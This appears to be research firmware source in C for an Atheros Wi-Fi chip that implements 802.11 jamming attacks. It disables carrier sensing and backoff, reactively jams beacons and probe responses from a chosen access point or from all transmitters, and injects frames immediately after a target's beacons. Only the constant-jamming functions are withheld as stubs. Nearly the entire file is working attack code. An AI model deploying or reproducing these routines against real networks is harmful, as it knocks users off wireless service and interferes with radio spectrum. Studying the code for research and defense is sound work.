#include <adf_os_types.h>
#include <adf_os_pci.h>
#include <adf_os_dma.h>
#include <adf_os_timer.h>
#include <adf_os_lock.h>
#include <adf_os_io.h>
#include <adf_os_mem.h>
#include <adf_os_util.h>
#include <adf_os_stdtypes.h>
#include <adf_os_defer.h>
#include <adf_os_atomic.h>
#include <adf_nbuf.h>
#include <adf_net.h>
#include <adf_net_wcmd.h>
#include <adf_os_irq.h>
#include <ah.h>
#include <if_ath_pci.h>

#include "if_llc.h"
#include "ieee80211_var.h"
#include "ieee80211_proto.h"
#include "if_athrate.h"
#include "if_athvar.h"
#include "ah_desc.h"
#include "ar5416reg.h"
#include "debug.h"
#include "ar5416desc.h"

#include "attacks.h"

/** CPU PLL register for Magpie - taken from ./magpie_fw_dev/build/magpie_1_1/inc/magpie/reg_defs.h */
#define CPU_PLL_BASE_ADDRESS        0x00056000

/** Calculate difference between two timestamps */
static inline unsigned int tickdiff(unsigned int curr, unsigned int prev)
{
	if (curr >= prev)
		return curr - prev;
	else
		return (~prev) + 1 + curr;
}

/** Update elapsed time in miliseconds, and return the time at which this update took place */
static inline unsigned int update_elapsed(unsigned int prev, unsigned int freq, unsigned int *elapsed)
{
	unsigned int curr = NOW();
	unsigned int diff = tickdiff(curr, prev);

	// convert diff to miliseconds
	diff = diff / (freq * 1000);
	*elapsed += diff;

	// don't return curr, but compensate for rounding errors in division above
	return prev + diff * freq * 1000;
}


/** 
 * Configure the radio for jammin purposes. Recommended to disable interrupts
 * before calling this function.
 */
int attack_confradio(struct ath_softc_tgt *sc, int jam)
{
	int q;

	if (jam)
	{
		/* Ignore physical and virtual carrier sensing */
		iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW)
			| AR_DIAG_FORCE_RX_CLEAR | AR_DIAG_IGNORE_VIRT_CS);
	}

	/*  Set SIFS to small value - ath9k_hw_set_sifs_time */
	iowrite32_mac(AR_D_GBL_IFS_SIFS, jam ? 1 : 10);

	/*  Set slot time to value - ath9k_hw_setslottime */
	iowrite32_mac(AR_D_GBL_IFS_SLOT, jam ? 1 : 10);

	/*  Set EIFS to small value - ath9k_hw_set_eifs_timeout */
	iowrite32_mac(AR_D_GBL_IFS_EIFS, 1);

	/* Disable backoff behaviour by setting parameters to zero */
	for (q = 0; q < HAL_NUM_TX_QUEUES; q++) {
		/* Reset CW_MIN, CW_MAX, and AIFSN for every transmit queue */
		iowrite32_mac(AR_DLCL_IFS(q), 0);
	}

	// Alternative / additional interesting registers:
	// - AR_D_GBL_IFS_MISC to disable backoff (and other optimizations)
	// - AR_DMISC to disable backoff for each queue
	// - AR_DCHNTIME to set unlimited channel time for each queue
	// - AR_Q_TXD to disable Tx on other queues (see datasheet for usage)
	// - AR_DMISC to disable post backoff and virtual collision handling

	return 0;
}


/**
 * Allocate and construct a buffer ready for transmission.
 *
 * @data and @len: content of the packet to construct. The pointer is allowed to
             be zero. In this case a buffer of length `len` is filled with 0x88.
 * @waitack: set to 1 to retransmit the packet. If enabled, the sender MAC address
 *           is overwritten with that of the wireless chip (so we can detect ACKs).
 * @destmac: destination MAC address to use. Can be set to NULL to ignore. Usefull
 *           if you give a NULL data buffer.
 *
 * FIXME: Perhaps just use ath_tgt_send_mgt without the last ath_tgt_txqaddbuf call?
 */
struct ath_tx_buf * attack_build_packet(
	struct ath_softc_tgt *sc, uint8_t *data,
	a_int32_t len, char waitack, unsigned char destmac[6])
{
	struct ieee80211_node_target *ni;
	struct ath_hal *ah = sc->sc_ah;
	a_uint8_t txrate;
	a_int32_t i, hdrlen, pktlen;
	struct ath_tx_buf *bf;
	adf_nbuf_t skb;
	struct ath_rc_series rcs[4];
	HAL_11N_RATE_SERIES series[4];
	unsigned char *buff;
	const HAL_RATE_TABLE *rt;

	//
	// Step 1 - Initialize stuff
	//

	adf_os_mem_set(rcs, 0, sizeof(struct ath_rc_series)*4);
	adf_os_mem_set(series, 0, sizeof(HAL_11N_RATE_SERIES)*4);

	// second argument is of type struct ath_vap_target *
	rcs[0].rix = ath_get_minrateidx(sc, &sc->sc_vap[0]);
	rcs[0].tries = ATH_TXMAXTRY;
	rcs[0].flags = 0;

	adf_os_assert(sc->sc_currates != NULL);
	rt = sc->sc_currates;
	txrate = rt->info[rcs[0].rix].rateCode;

	for (i=0; i < 4; i++) {
		series[i].Tries = 2;
		series[i].Rate = txrate;
		series[i].ChSel = sc->sc_ic.ic_tx_chainmask;
		series[i].RateFlags = 0;
	}

	//
	// Step 2 - Build ath_tx_buff
	//

	// Allocate skb for the packets
	skb = BUF_Pool_alloc_buf_align(sc->pool_handle, POOL_ID_ATTACKS, len, 0);
	if (skb == NULL) {
		printk("adf_nbuf_alloc failed\n");
		return NULL;
	}
	buff = adf_nbuf_put_tail(skb, len);

	// fill main packet content
	if (data)
		adf_os_mem_copy(buff, data, len);
	else
		adf_os_mem_set(buff, 0x88, len);

	// set destination mac if given
	if (destmac) adf_os_mem_copy(buff + 4, destmac, 6);

	// include sender MAC address if enough room, and no frame is already given,
	// to discourage malicious usage
	if (data == NULL && len >= 4 + 6 + 6)
	{
		unsigned int id0 = ioread32_mac(AR_STA_ID0);
		unsigned int id1 = ioread32_mac(AR_STA_ID1);

		buff[4 + 6 + 0] = (id0      ) & 0xFF;
		buff[4 + 6 + 1] = (id0 >> 8 ) & 0xFF;
		buff[4 + 6 + 2] = (id0 >> 16) & 0xFF;
		buff[4 + 6 + 3] = (id0 >> 24) & 0xFF;
		buff[4 + 6 + 4] = (id1      ) & 0xFF;
		buff[4 + 6 + 5] = (id1 >> 8 ) & 0xFF;
	}

	hdrlen = ieee80211_anyhdrsize(buff);
	pktlen = len - (hdrlen & 3);
	pktlen += IEEE80211_CRC_LEN;

	// sc->sc_sta[0] is of type struct ath_node_target *
	ni = &sc->sc_sta[0].ni;
	if (!sc->sc_sta[0].an_valid || ni->ni_vap == NULL) goto fail;

	// Get a transmit descriptor buffer for the packet
	bf = asf_tailq_first(&sc->sc_txbuf);
	if (!bf) {
		printk("asf_tailq_first failed\n");
		BUF_Pool_free_buf(sc->pool_handle, POOL_ID_ATTACKS, skb);
		return NULL;
	}
	asf_tailq_remove(&sc->sc_txbuf, bf, bf_list);

	bf->bf_cookie = 0;
	bf->bf_endpt = 5;
	bf->bf_protmode = 0;
	// Generate an interrupt when the frame has been transmitted and XXX
	bf->bf_flags = HAL_TXDESC_INTREQ | HAL_TXDESC_CLRDMASK;
	bf->bf_skb = skb;
	bf->bf_node = ni;
	adf_os_mem_copy(bf->bf_rcs, rcs, sizeof(rcs));
	// Data going from device to memory
	adf_nbuf_map(sc->sc_dev, bf->bf_dmamap, skb, ADF_OS_DMA_TO_DEVICE);
	adf_nbuf_queue_add(&bf->bf_skbhead, skb);

	//
	// Step 3 - Build descriptor buffer
	//	

	if (!waitack) bf->bf_flags |= HAL_TXDESC_NOACK;

	// Sets control/status flags in ath_tx_desc. See ar5416_hw.c:ar5416SetupTxDesc_20.
	ah->ah_setupTxDesc(bf->bf_desc
			    , pktlen			  /* packet length */
			    , hdrlen			  /* header length */
			    , HAL_PKT_TYPE_NORMAL	  /* Atheros packet type */
			    , 63			  /* txpower (63 is the maximum) */
			    , txrate			  /* XXX - series 0 rate/tries */
			    , 0				  /* number of retries (only applicable for Tx queue 0... though it appears to have no affect) */
			    , HAL_TXKEYIX_INVALID	  /* key cache index */
			    , bf->bf_flags		  /* can include HAL_TXDESC_NOACK */
			    , 0				  /* XXX - rts/cts rate */
			    , 0				  /* XXX - rts/cts duration */
			    );

	ath_filltxdesc(sc, bf);

	// sets various control registers in ath_bf_desc
	ah->ah_set11nRateScenario(bf->bf_desc, 0 /* durUpdateEn */, 0 /* ctsrate */, series, 4, 0 /* flags */);

	return bf;

fail:
	attack_free_packet(sc, bf);
	return NULL;
}


static void attack_skb_free(struct ath_softc_tgt *sc,
			     adf_nbuf_queue_t *head,
			     HTC_ENDPOINT_ID endpt)
{
	adf_nbuf_t tskb;

	while (adf_nbuf_queue_len(head) != 0) {
		tskb = adf_nbuf_queue_remove(head);
		BUF_Pool_free_buf(sc->pool_handle, POOL_ID_ATTACKS, tskb);
	}
}


void attack_free_packet(struct ath_softc_tgt *sc, struct ath_tx_buf *bf)
{
	a_int32_t i ;
	struct ath_tx_desc *bfd = NULL;
	struct ath_hal *ah = sc->sc_ah;

	for (bfd = bf->bf_desc, i = 0; i < bf->bf_dmamap_info.nsegs; bfd++, i++) {
		ah->ah_clr11nAggr(bfd);
		ah->ah_set11nBurstDuration(bfd, 0);
		ah->ah_set11nVirtualMoreFrag(bfd, 0);
	}

	ath_dma_unmap(sc, bf);
	attack_skb_free(sc, &bf->bf_skbhead,bf->bf_endpt);
	ath_tx_freedesc(sc, bf);
}


/**
 * Reactively jam beacons and probe responses from an AP having MAC address `source`.
 * The attack is executed for `msecs` milisconds. If the MAC address `source` is a
 * multicast/broadcast address, then *all* beacons and probe responses will be jammed.
 *
 * Possible improvements/changes:
 * - Send larger packets so there is more overlap.
 * - Properly free the memory. Now we construct a buffer lazily and don't free it.
 * - Call the "OS update tick" routine so we don't manually have to manage the clock.
 * - Make more usage of the functions in ar5416_hw.c
 */
int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
		       unsigned int msecs)
{
	static const int TXQUEUE = 0;
	static struct ath_tx_buf *bf;
	struct ath_hal *ah = sc->sc_ah;
	struct ath_rx_desc *ds, *ds2;
	struct ar5416_desc_20 *ads, *ads2, *txads;
	volatile unsigned char *buff;
	unsigned int elapsed, freq, prev;

	//dump_rx_macbufs(ah);
	//dump_rx_tailq(sc);
	printk(">reactjam\n");

	// disable (simulated) interrupts and configure radio
	ah->ah_setInterrupts(sc->sc_ah, 0);

	//
	// Prepare for transmission of injected packet
	//	

	attack_confradio(sc, 1);

	// Change 3rd parameter to 1 to retransmit the dummy packet.
	bf = attack_build_packet(sc, NULL, 24, 0, NULL);
	txads = AR5416DESC_20(bf->bf_desc);

	//
	// Prepare self-linked Rx buffer 
	//

	// - We cannot chance the ds_link field of the descriptor currently in use. It seems
	//   this value is cached? Work around this by using the second frame.
	// - Even though we will skip the first transmit descriptor, the wireless chips still
	//   seems to mark it with AR_RxDone. Worth further investigation.
	ds = (struct ath_rx_desc *)ar5416GetRxDP(ah);
	ds = (struct ath_rx_desc *)ds->ds_link;
	ds2 = (struct ath_rx_desc *)ds->ds_link;
	ds->ds_list.tqe_next = ds;
	ds->ds_link = (unsigned int)ds;

	ads  = (struct ar5416_desc_20 *)ds;
	ads2 = (struct ar5416_desc_20 *)ads2;

	ah->ah_setRxDP(ah, 0);

	//
	// Initialize Timer
	//

	// frequency in MHz
#ifdef MAGPIE_MERLIN
	// Note: ioread32_mac uses WLAN_BASE_ADDRESS as base, hence we can't use it.
	freq = *(unsigned int *)CPU_PLL_BASE_ADDRESS;
	freq = (freq - 5) / 4;// XXX properly reverse register content
	if (freq == 0) return 1;
#else
	freq = 117;
#endif

	elapsed = 0;
	prev = NOW();

	//
	// MONITOR THE BUFFERS
	//

	ah->ah_setRxDP(ah, (unsigned int)ads);

	// Enable Rx
	iowrite32_mac(AR_CR, AR_CR_RXE);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);

	while (elapsed < msecs)
	{
		// fill in data that shouldn't occur in valid 802.11 frames
		buff = (volatile unsigned char *)ds->ds_data;
		buff[15] = 0xF1;

		// prepare to send jam packet
		txads->ds_txstatus9 &= ~AR_TxDone;

		// Wait until frame has been detected, exit if it takes too long
		while (elapsed < msecs && buff[15] == 0xF1) {
			prev = update_elapsed(prev, freq, &elapsed);
		}

		// Exit on timeout, otherwise we recieved something
		if (elapsed >= msecs) break;

		// Candidates for determining length of ongoing reception:
		//  - ds_rxstatus1 & AR_DataLen  : #bytes already written to RAM
		//  - ds_rxstatus1 & AR_NumDelim : always zero?

		// 1. Jam beacons and probe responses (0x80 and 0x50, respectively)
		// 2. - If source is a multicast MAC address, then jam *all* transmitters
		//    - Otherwise jam only the transmitter with MAC address `source`
		if ( (buff[0] == 0x80 || buff[0] == 0x50)
		     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
		{
			// Abort Rx
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;

			// Jam the packet
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(TXQUEUE))) = (a_uint32_t)txads;
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_Q_TXE)) = 1 << TXQUEUE;

			// Re-enable Rx for once packet is transmitted
			iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);

			// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
			// until we receive the next frame.
			printk("+");
		} else {
			printk("-");
		}

		// update elapsed time
		prev = update_elapsed(prev, freq, &elapsed);
	}

	printk("\n");

	//
	// Cleanup
	//

	// fix the linked list
	ds->ds_list.tqe_next = ds2;
	ds->ds_link = (unsigned int)ds2;

	// restore the recieve descriptor
	ads->ds_rxstatus8 &= ~AR_RxDone;
	ah->ah_setRxDP(ah, (unsigned int)ds);

	//dump_rx_macbufs(ah);
	//dump_rx_tailq(sc);

	// remove pointer to packet ready to transmit
	ah->ah_abortTxDma(ah);
	*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(TXQUEUE))) = 0;

	// Assure Rx is still enabled
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
	iowrite32_mac(AR_CR, AR_CR_RXE);

	// re-enable interrupts
	ah->ah_setInterrupts(sc->sc_ah, sc->sc_imask);

	// free memory and return
	attack_free_packet(sc, bf);
	printk("<reactjam\n");

	return 0;
}


/**
 * Monitor the air for beacons from a specific MAC address. Immediately reply with
 * the given packet in `bf` **AFTER** the real beacon was transmitted (jamming is risky).
 *
 * FIXME: Very large code overlap with attack_reactivejam
 */
int attack_fastreply(struct ath_softc_tgt *sc, struct ath_tx_buf *bf, unsigned char source[6], unsigned int msecs, int jam)
{
	static const int TXQUEUE = 0;
	struct ath_hal *ah = sc->sc_ah;
	struct ath_rx_desc *ds, *ds2, *ds3, *ds4;
	struct ath_txq *txq;
	volatile struct ar5416_desc_20 *txads, *rxads;
	volatile unsigned char *buff;
	unsigned int elapsed, freq, prev;

	if (jam) printk("jam-");
	printk("fastreply\n");

	// disable (simulated) interrupts and configure radio
	ah->ah_setInterrupts(sc->sc_ah, 0);

	//
	// Prepare for transmission of injected packet
	//	

	attack_confradio(sc, jam);

	// add buffer to the Tx list, save ath_tx_desc of the buffer
	txq = &sc->sc_txq[TXQUEUE];
	ATH_TXQ_INSERT_TAIL(txq, bf, bf_list);
	txq->axq_link = &bf->bf_lastds->ds_link;
	txads = AR5416DESC_20(bf->bf_desc);

	//
	// Prepare circular Rx buffer list: ds -> ds2 -> ds3 -> ds -> ...
	//

	ds = asf_tailq_first(&sc->sc_rxdesc);
	ds2 = asf_tailq_next(ds, ds_list);
	ds3 = asf_tailq_next(ds2, ds_list);
	ds4 = asf_tailq_next(ds3, ds_list);

	ds3->ds_list.tqe_next = ds;
	ds3->ds_link = (unsigned int)ds;

	//
	// Initialize Timer
	//

	// frequency in MHz
#ifdef MAGPIE_MERLIN
	// Note: OS_REG_READ uses WLAN_BASE_ADDRESS as base, hence we can't use it.
	freq = *(unsigned int *)CPU_PLL_BASE_ADDRESS;
	freq = (freq - 5) / 4;
	if (freq == 0) return 1;
#else
	freq = 117;
#endif

	elapsed = 0;
	prev = NOW();

	//
	// MONITOR THE BUFFERS
	//

	rxads = AR5416DESC_20(ds);
	ah->ah_setRxDP(ah, (unsigned int)rxads);

	// Enable Rx
	iowrite32_mac(AR_CR, AR_CR_RXE);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);

	while (elapsed < msecs)
	{
		// fill in data that shouldn't occur in valid 802.11 frames
		buff = (volatile unsigned char *)rxads->ds_data;
		buff[15] = 0xF1;

		// prepare to send jam packet
		txads->ds_txstatus9 &= ~AR_TxDone;

		// Wait until frame has been detected, exit if it takes too long
		while (elapsed < msecs && buff[15] == 0xF1) {
			prev = update_elapsed(prev, freq, &elapsed);
		}

		// Exit on timeout, otherwise we recieved something
		if (elapsed >= msecs) break;

		// jam beacons and probe responses from the bssid
		if (A_MEMCMP(source, buff + 10, 6) == 0 && buff[0] == 0x80)
		{
			// Abort Rx (XXX this assures the injected frame is sent fast enough)
			if (jam) {
				*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
			}

			// Immediately sent the packet after beacon is received
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(txq->axq_qnum))) = (a_uint32_t)txads;
			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_Q_TXE)) = 1 << txq->axq_qnum;

			// Re-enable Rx for once packet is transmitted
			if (jam) {
				iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);
			}

			// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
			// until we receive the next frame.
			printk("+");
		} else {
			printk("-");
		}

		// move to next buffer in the (circular) list
		rxads = AR5416DESC_20(rxads->ds_link);

		// update elapsed time
		prev = update_elapsed(prev, freq, &elapsed);
	}

	printk("\n");

	//
	// Cleanup
	//

	// fix the linked list
	ds3->ds_list.tqe_next = ds4;
	ds3->ds_link = (unsigned int)ds4;

	// Temporarily disable Rx
	iowrite32_mac(AR_CR, AR_CR_RXD);
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) | AR_DIAG_RX_DIS);

	// Clear "received flag" of all subsequent buffers
	// ds = (struct ath_rx_desc *)ar5416GetRxDP(ah); --- XXX TODO is this correct?
	rxads = (struct ar5416_desc_20 *)ar5416GetRxDP(ah);
	while (rxads != NULL) {
		rxads->ds_rxstatus8 &= ~AR_RxDone;
		rxads = (struct ar5416_desc_20 *)rxads->ds_link;
	}

	// Enable Rx again
	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
	iowrite32_mac(AR_CR, AR_CR_RXE);

	// re-enable interrupts
	ah->ah_setInterrupts(sc->sc_ah, sc->sc_imask);

	printk("<fastreply\n");

	return 0;
}


int attack_constantjam_start(struct ath_softc_tgt *sc, char waitack,
			     unsigned char destmac[6], a_uint16_t length)
{
	// No public implementation! If you are a researcher, you can request the code.
	printk("constantjam_start not implemented\n");
	return 1;
}


int attack_constantjam_stop(struct ath_softc_tgt *sc)
{
	// No public implementation! If you are a researcher, you can request the code.
	printk("constantjam_stop not implemented\n");
	return 1;
}



